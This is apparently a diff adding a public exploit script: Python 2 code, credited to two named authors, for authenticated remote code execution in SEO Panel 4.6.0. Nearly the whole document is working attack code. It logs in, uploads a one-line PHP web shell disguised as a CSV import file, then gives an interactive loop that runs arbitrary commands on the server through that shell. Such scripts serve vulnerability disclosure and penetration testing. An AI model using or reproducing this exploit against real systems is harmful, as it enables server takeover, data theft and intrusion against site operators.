@@ -1,0 +1,61 @@
+# Exploit Title: SEO Panel 4.6.0 - Remote Code Execution
+# Google Dork: N/A
+# Date: 2020-10-03
+# Exploit Author: Kiko Andreu (kikoas1995) & Daniel Monzón (stark0de)
+# Vendor Homepage: https://seopanel.org/
+# Software Link: https://www.seopanel.org/spdownload/4.6.0
+# Version: 4.6.0
+# Tested on: Kali Linux x64 5.4.0
+# CVE : N/A
+
+#!/usr/bin/python
+
+import sys
+import os
+import requests
+
+ip = sys.argv[1]
+user = sys.argv[2]
+pwd = sys.argv[3]
+port = sys.argv[4]
+proto = sys.argv[5]
+
+if (len(sys.argv) < 6):
+    print "Usage: python " + sys.argv[0] + " <ip> + <webapp user> + <webapp pwd> + <webapp port> + <http/https>"
+    exit()
+
+session = requests.session()
+
+# Get to login page
+burp0_url = proto + "://" + ip + ":" + port + "//login.php"
+burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "DNT": "1", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
+session.get(burp0_url, headers=burp0_headers, verify=False)
+
+# Login with the provided credentials 
+burp0_url = proto + "://" + ip + ":" + port + "//login.php"
+burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": proto + "://" + ip + "//login.php", "Content-Type": "application/x-www-form-urlencoded", "DNT": "1", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
+burp0_data = {"sec": "login", "red_referer": proto + "://" + ip + "/", "userName": user, "password": pwd, "login": ''}
+session.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)
+
+# Upload the webshell
+burp0_url = proto + "://" + ip + ":" + port + "//websites.php"
+burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": proto + "://" + ip + "//admin-panel.php", "Content-Type": "multipart/form-data; boundary=---------------------------193626971803013289998688514", "DNT": "1", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
+burp0_data = "-----------------------------193626971803013289998688514\r\nContent-Disposition: form-data; name=\"sec\"\r\n\r\nimport\r\n-----------------------------193626971803013289998688514\r\nContent-Disposition: form-data; name=\"userid\"\r\n\r\n1\r\n-----------------------------193626971803013289998688514\r\nContent-Disposition: form-data; name=\"website_csv_file\"; filename=\"shell.php\"\r\nContent-Type: text/csv\r\n\r\n<?php system($_GET['c']); ?>\r\n-----------------------------193626971803013289998688514\r\nContent-Disposition: form-data; name=\"delimiter\"\r\n\r\n,\r\n-----------------------------193626971803013289998688514\r\nContent-Disposition: form-data; name=\"enclosure\"\r\n\r\n\"\r\n-----------------------------193626971803013289998688514\r\nContent-Disposition: form-data; name=\"escape\"\r\n\r\n\\\r\n-----------------------------193626971803013289998688514--\r\n"
+session.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)
+
+exit = 0
+first = 1
+# Loop for remote code execution
+while (exit == 0):
+    cmd = raw_input("> ")
+
+    burp0_url = proto + "://" + ip + ":" + port + "//tmp/shell.php?c=" + cmd
+    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "DNT": "1", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
+    x = session.get(burp0_url, headers=burp0_headers, verify=False)  
+    if (x.status_code == 200 and first == 1):
+        first = 0
+        print "[+] Shell uploaded successfully!"
+    
+    print x.text 
+    if (cmd == "exit"):
+        exit = 1
